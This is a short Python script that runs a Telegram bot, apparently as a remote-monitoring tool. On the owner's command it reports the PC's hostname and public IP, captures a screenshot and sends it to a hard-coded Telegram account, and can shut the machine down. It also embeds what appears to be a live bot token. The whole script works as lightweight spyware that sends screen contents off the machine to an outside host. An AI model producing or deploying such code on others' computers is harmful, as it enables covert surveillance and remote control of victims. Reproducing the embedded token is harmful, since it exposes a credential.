import telebot
import pyautogui
from io import BytesIO
import socket
import os
import requests
import threading

TOKEN = '8298701250:AAHfhWw3wk6Xw15UumisaB4avPyKDuid_SU'
MY_ID = 7497410701
bot = telebot.TeleBot(TOKEN)

def get_info():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        host = socket.gethostname()
        return f"🖥 {host} | IP: {ip}"
    except:
        return "🖥 Unknown PC"

@bot.message_handler(commands=['ping'])
def manual_ping(message):
    if message.from_user.id == MY_ID:
        bot.reply_to(message, f"✅ Online: {get_info()}")

@bot.message_handler(commands=['screen'])
def send_screen(message):
    if message.from_user.id == MY_ID:
        try:
            screen = pyautogui.screenshot()
            buf = BytesIO()
            screen.save(buf, format='PNG')
            buf.seek(0)
            bot.send_photo(MY_ID, buf, caption=get_info())
        except:
            pass

@bot.message_handler(commands=['off-confirm'])
def shutdown_pc(message):
    if message.from_user.id == MY_ID:
        os.system("shutdown /s /t 1")

if __name__ == "__main__":
    bot.polling(none_stop=True)